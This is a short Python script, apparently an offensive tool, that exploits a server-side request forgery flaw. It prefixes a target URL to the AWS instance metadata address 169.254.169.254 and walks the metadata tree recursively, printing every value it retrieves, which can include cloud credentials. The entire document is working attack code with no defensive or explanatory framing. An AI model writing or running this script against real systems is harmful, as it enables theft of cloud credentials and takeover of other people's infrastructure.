import requests
import sys


class IsUnstealthyNinja:
    def __init__(self):
        self.base_url = ""
        self.base_ssrf_url = "http://169.254.169.254/latest/"

        self.results = []

    def gonna_have_to_choke_a_cloud(self):
        self.base_url = sys.argv[1] + self.base_ssrf_url
        lines = requests.get(self.base_url).text.splitlines()

        for line in lines:
            print(line)
            self.check_ssrf_vulnerability_recursively(f"{self.base_url}/{line}/")

        for item in self.results:
            for key, value in item.items():
                print(f"URL: {key} - Value: ${value}")

    def check_ssrf_vulnerability_recursively(self, url):
        r = requests.get(url)
        for l in r.text.splitlines():
            if l:
                new_url = f"{url}{l}"
                if l.endswith("/"):
                    self.check_ssrf_vulnerability_recursively(new_url)
                else:
                    r = requests.get(new_url)
                    if r.status_code == 200:
                        self.results.append({new_url: r.text})


if __name__ == "__main__":
    i = IsUnstealthyNinja()
    i.gonna_have_to_choke_a_cloud()
